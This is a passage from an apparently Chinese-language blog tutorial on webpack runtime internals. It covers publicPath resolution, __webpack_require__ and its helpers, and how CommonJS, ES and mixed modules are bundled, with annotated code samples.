__webpack_require__.<span class="property">p</span> = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>如果没有指定 publicPath，webpack 将会按照下面的方法，在不同的脚本运行环境来自动获取基础路径，如果无法正常获取则会报错：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">!(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> scriptUrl;</span><br><span class="line">  <span class="comment">// 在 web worker 环境下获取 scriptUrl</span></span><br><span class="line">  <span class="keyword">if</span> (__webpack_require__.<span class="property">g</span>.<span class="property">importScripts</span>)</span><br><span class="line">    scriptUrl = __webpack_require__.<span class="property">g</span>.<span class="property">location</span> + <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable language_">document</span> = __webpack_require__.<span class="property">g</span>.<span class="property">document</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 在浏览器环境下获取 scriptUrl</span></span><br><span class="line">  <span class="keyword">if</span> (!scriptUrl &amp;&amp; <span class="variable language_">document</span>) &#123;</span><br><span class="line">    <span class="comment">// Document.currentScript 属性返回当前正在运行的脚本所属的 &lt;script&gt; 元素</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">currentScript</span>) scriptUrl = <span class="variable language_">document</span>.<span class="property">currentScript</span>.<span class="property">src</span>;</span><br><span class="line">    <span class="keyword">if</span> (!scriptUrl) &#123;</span><br><span class="line">      <span class="keyword">var</span> scripts = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (scripts.<span class="property">length</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> i = scripts.<span class="property">length</span> - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &gt; -<span class="number">1</span> &amp;&amp; !scriptUrl) scriptUrl = scripts[i--].<span class="property">src</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 当支持不支持自动 publicPath 的浏览器时，您必须通过配置手动指定 output.publicPath</span></span><br><span class="line">  <span class="comment">// 或者传递一个空字符串 (&quot;&quot;) 并从您的代码中设置 __webpack_public_path__ 变量以使用您自己的逻辑。</span></span><br><span class="line">  <span class="keyword">if</span> (!scriptUrl)</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Automatic publicPath is not supported in this browser&#x27;</span>);</span><br><span class="line">  <span class="comment">// 通过正则表达式替换 scriptUrl 中的 # 和 ? 之后的内容，以及最后一个 / 之后的内容，最终得到的就是 publicPath</span></span><br><span class="line">  scriptUrl = scriptUrl</span><br><span class="line">    .<span class="title function_">replace</span>(<span class="regexp">/#.*$/</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    .<span class="title function_">replace</span>(<span class="regexp">/\?.*$/</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    .<span class="title function_">replace</span>(<span class="regexp">/\/[^\/]+$/</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  <span class="comment">// 设置 publicPath</span></span><br><span class="line">  __webpack_require__.<span class="property">p</span> = scriptUrl;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>在代码运行时，我们可以使用 <code>__webpack_public_path__</code> 来指定模块引用的基础路径，如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在代码运行 1000 ms 后将基础路径指定为 &#x27;/woo&#x27;</span></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  __webpack_public_path__ = <span class="string">&#x27;/woo&#x27;</span>;</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><p>编译后的代码实际上就是将 <code>__webpack_require__.p</code> 进行了重新赋值：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  __webpack_require__.<span class="property">p</span> = <span class="string">&#x27;/woo&#x27;</span>;</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><h2 id="webpack-require-o"><a href="#webpack-require-o" class="headerlink" title="__webpack_require__.o"></a><code>__webpack_require__.o</code></h2><p>这个方法是 Webpack 用于检测对象是否具有指定名称的属性，但不会检查原型链上的属性。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* webpack/runtime/hasOwnProperty shorthand */</span></span><br><span class="line">!(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  __webpack_require__.<span class="property">o</span> = <span class="keyword">function</span> (<span class="params">obj, prop</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">hasOwnProperty</span>.<span class="title function_">call</span>(obj, prop);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h2 id="webpack-modules"><a href="#webpack-modules" class="headerlink" title="__webpack_modules__"></a><code>__webpack_modules__</code></h2><p>webpack 将编写代码时使用 cjs、esm 导入导出的模块进行转换后存放在该变量下，其格式为：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">WebpackModules</span> = &#123;</span><br><span class="line">[<span class="attr">moduleId</span>: <span class="built_in">string</span>]: <span class="function">(<span class="params"><span class="variable language_">module</span>, <span class="built_in">exports</span>, __webpack_require__</span>) =&gt;</span> <span class="built_in">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="webpack-module-cache"><a href="#webpack-module-cache" class="headerlink" title="__webpack_module_cache__"></a><code>__webpack_module_cache__</code></h2><p>webpack 的模块缓存，默认为一个空对象，用于存放模块的注册结果，避免重复注册。</p><h2 id="webpack-require"><a href="#webpack-require" class="headerlink" title="__webpack_require__"></a><code>__webpack_require__</code></h2><p>如果要使用 Webpack 处理过的模块，就需要使用该方法进行导入，该方法创建了一个 <code>module</code> 对象，并从 <code>__webpack_modules__</code> 拿到对应的模块注册方法，执行模块并将模块导出的内容挂载在 <code>module</code> 对象上，让后将 <code>module</code> 对象缓存在 <code>__webpack_module_cache__</code> 中：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">__webpack_require__</span>(<span class="params">moduleId</span>) &#123;</span><br><span class="line">  <span class="comment">// 检查模块是否已经被读取过了</span></span><br><span class="line">  <span class="keyword">var</span> cachedModule = __webpack_module_cache__[moduleId];</span><br><span class="line">  <span class="keyword">if</span> (cachedModule !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> cachedModule.<span class="property">exports</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 创建一个新模块并加入缓存</span></span><br><span class="line">  <span class="keyword">var</span> <span class="variable language_">module</span> = (__webpack_module_cache__[moduleId] = &#123;</span><br><span class="line">    <span class="attr">id</span>: moduleId,</span><br><span class="line">    <span class="attr">loaded</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">exports</span>: &#123;&#125;,</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 执行模块（也就是注册模块）</span></span><br><span class="line">  __webpack_modules__[moduleId](<span class="variable language_">module</span>, <span class="variable language_">module</span>.<span class="property">exports</span>, __webpack_require__);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 标记加载状态</span></span><br><span class="line">  <span class="variable language_">module</span>.<span class="property">loaded</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 返回模块导出对象</span></span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">module</span>.<span class="property">exports</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Webpack-打包-CJS-模块"><a href="#Webpack-打包-CJS-模块" class="headerlink" title="Webpack 打包 CJS 模块"></a>Webpack 打包 CJS 模块</h1><p>创建一个 CJS 规范的模块：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">reduce</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  add,</span><br><span class="line">  reduce,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">CJS_CONSTANCE</span> = <span class="string">&#x27;constance&#x27;</span>;</span><br></pre></td></tr></table></figure><p>webpack 会将代码打包为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Webpack 处理后的 CJS 模块</span></span><br><span class="line"><span class="keyword">var</span> __webpack_modules__ = &#123;</span><br><span class="line">  <span class="number">834</span>: <span class="keyword">function</span> (<span class="params"></span></span><br><span class="line"><span class="params">    <span class="variable language_">module</span>,</span></span><br><span class="line"><span class="params">    <span class="built_in">exports</span>,</span></span><br><span class="line"><span class="params">  </span>) &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reduce</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> a - b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">      add,</span><br><span class="line">      reduce,</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">exports</span>.<span class="property">CONSTANCE</span> = <span class="string">&#x27;constance&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当执行 <code>__webpack_require__(834)</code> 时，会将模块导出的对象挂载在 <code>module</code> 上，并返回 <code>module.exports</code>。</p><h1 id="Webpack-打包-ESM-模块"><a href="#Webpack-打包-ESM-模块" class="headerlink" title="Webpack 打包 ESM 模块"></a>Webpack 打包 ESM 模块</h1><p>创建一个 ESM 规范的模块：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">cloneDeep</span>(<span class="params">obj, hash = <span class="keyword">new</span> <span class="built_in">WeakMap</span>()</span>) &#123;</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">  <span class="keyword">return</span> cloneObj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">esmAdd</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">unusedFunc</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;this is a unused function&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="variable constant_">ESM_CONSTANCE</span> = <span class="string">&#x27;constance&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;this is a default export&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>webpack 对于使用 ESM 规范引入的模块，并不是将其赋值到 <code>module.exports</code> 上，而是使用 <code>__webpack_require__.d</code>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Webpack 处理后的 ESM 模块</span></span><br><span class="line"><span class="keyword">var</span> __webpack_modules__ = &#123;</span><br><span class="line">  <span class="number">624</span>: <span class="keyword">function</span> (<span class="params"></span></span><br><span class="line"><span class="params">    __unused_webpack_module,</span></span><br><span class="line"><span class="params">    __webpack_exports__,</span></span><br><span class="line"><span class="params">    __webpack_require__,</span></span><br><span class="line"><span class="params">  </span>) &#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line">    <span class="comment">// 将 ESM 模块中的导出内容挂载到 exports 对象上</span></span><br><span class="line">    <span class="comment">// 这样使用 __webpack_require__ 就可以拿到导出内容了</span></span><br><span class="line">    <span class="comment">// 需要注意的是，未使用的 ESM 导出不会在此被注册，如 unusedFunc</span></span><br><span class="line">    <span class="comment">/* harmony export */</span> __webpack_require__.<span class="title function_">d</span>(__webpack_exports__, &#123;</span><br><span class="line">      <span class="comment">/* harmony export */</span> <span class="attr">K1</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="comment">/* binding */</span> <span class="variable constant_">ESM_CONSTANCE</span>;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">/* harmony export */</span> <span class="title class_">Xh</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="comment">/* binding */</span> cloneDeep;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">/* harmony export */</span> <span class="attr">ZP</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="comment">/* export default binding */</span> __WEBPACK_DEFAULT_EXPORT__;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">/* harmony export */</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">/* unused harmony exports esmAdd, unusedFunc */</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">cloneDeep</span>(<span class="params">obj, hash = <span class="keyword">new</span> <span class="built_in">WeakMap</span>()</span>) &#123;</span><br><span class="line">      <span class="comment">// ... ...</span></span><br><span class="line">      <span class="keyword">return</span> cloneObj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">esmAdd</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">unusedFunc</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;this is a unused function&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">ESM_CONSTANCE</span> = <span class="string">&#x27;constance&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* harmony default export */</span> <span class="keyword">function</span> <span class="title function_">__WEBPACK_DEFAULT_EXPORT__</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;this is a default export&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>__webpack_require__.d</code> 接受一个 <code>__webpack_require__</code> 中创建的 <code>exports</code> 对象，以及一个导出声明 <code>definition</code>。<code>definition</code> 是一个对象，其 key 为一个随机字符，value 为一个函数，函数执行后返回对应 ESM 模块导出的某个方法，<code>__webpack_require__.d</code> 就是将 <code>definition</code> 定义的各个方法挂载到 <code>exports</code> 对象上：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* webpack/runtime/define property getters */</span></span><br><span class="line">!(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// define getter functions for harmony exports</span></span><br><span class="line">  __webpack_require__.<span class="property">d</span> = <span class="keyword">function</span> (<span class="params"><span class="built_in">exports</span>, definition</span>) &#123;</span><br><span class="line"><span class="comment">// 遍历 definition 对象</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> definition) &#123;</span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line">        __webpack_require__.<span class="title function_">o</span>(definition, key) &amp;&amp;</span><br><span class="line">        !__webpack_require__.<span class="title function_">o</span>(<span class="built_in">exports</span>, key)</span><br><span class="line">      ) &#123;</span><br><span class="line">        <span class="comment">// 挂载属性</span></span><br><span class="line">        <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="built_in">exports</span>, key, &#123;</span><br><span class="line">          <span class="attr">enumerable</span>: <span class="literal">true</span>,</span><br><span class="line">          <span class="attr">get</span>: definition[key],</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>之所以使用 <code>__webpack_require__.d</code> 对 ESM 导出的内容通过属性注册的方式注册到 <code>module.exports</code> 上而不是直接赋值，这是因为 ESM 和 CJS 的特性不同决定的：ESM 导出的内容是只读的，所以 <code>exports</code> 上的属性只有 getter 没有 setter；ESM 模块导出的是对值的引用，因此需要返回存放值的变量，而 CJS 返回的是对值的拷贝。</p><h1 id="Webpack-打包混用模块"><a href="#Webpack-打包混用模块" class="headerlink" title="Webpack 打包混用模块"></a>Webpack 打包混用模块</h1><h3 id="CJS-中使用-require-引入"><a href="#CJS-中使用-require-引入" class="headerlink" title="CJS 中使用 require 引入"></a>CJS 中使用 require 引入</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; esmAdd &#125; = <span class="built_in">require</span>(<span class="string">&#x27;./index&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">esmAdd</span>(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">reduce</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  add,</span><br><span class="line">  reduce,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">CJS_CONSTANCE</span> = <span class="string">&#x27;constance&#x27;</span>;</span><br></pre></td></tr></table></figure><p>打包后：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> __webpack_modules__ = &#123;</span><br><span class="line">  <span class="number">834</span>: <span class="keyword">function</span> (<span class="params"><span class="variable language_">module</span>, <span class="built_in">exports</span>, __webpack_require__</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; esmAdd &#125; = <span class="title function_">__webpack_require__</span>(<span class="number">624</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">esmAdd</span>(a, b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reduce</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> a - b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">      add,</span><br><span class="line">      reduce,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exports</span>.<span class="property">CJS_CONSTANCE</span> = <span class="string">&#x27;constance&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>__webpack_require__</code> 来引入其他模块，没啥特别的。</p><h2 id="CJS-中使用-import-引入"><a href="#CJS-中使用-import-引入" class="headerlink" title="CJS 中使用 import 引入"></a>CJS 中使用 import 引入</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; esmAdd &#125; <span class="keyword">from</span> <span class="string">&#x27;./index&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">esmAdd</span>(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">reduce</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  add,</span><br><span class="line">  reduce,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">CJS_CONSTANCE</span> = <span class="string">&#x27;constance&#x27;</span>;</span><br></pre></td></tr></table></figure><p>打包后：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> __webpack_modules__ = &#123;</span><br><span class="line">  <span class="number">834</span>: <span class="keyword">function</span> (<span class="params"></span></span><br><span class="line"><span class="params">    <span class="variable language_">module</span>,</span></span><br><span class="line"><span class="params">    __unused_webpack___webpack_exports__,</span></span><br><span class="line"><span class="params">    __webpack_require__,</span></span><br><span class="line"><span class="params">  </span>) &#123;</span><br><span class="line">    <span class="comment">/* harmony import */</span> <span class="keyword">var</span> _index__WEBPACK_IMPORTED_MODULE_0__ =</span><br><span class="line">      <span class="title function_">__webpack_require__</span>(<span class="number">624</span>);</span><br><span class="line">    <span class="comment">/* module decorator */</span> <span class="variable language_">module</span> = __webpack_require__.<span class="title function_">hmd</span>(<span class="variable language_">module</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> (<span class="number">0</span>, _index__WEBPACK_IMPORTED_MODULE_0__ <span class="comment">/* .esmAdd */</span>.<span class="property">bO</span>)(a, b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reduce</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> a - b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">      add,</span><br><span class="line">      reduce,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exports</span>.<span class="property">CJS_CONSTANCE</span> = <span class="string">&#x27;constance&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样的产出在浏览器中是无法正常运行的，控制台会报错：</p><p><img 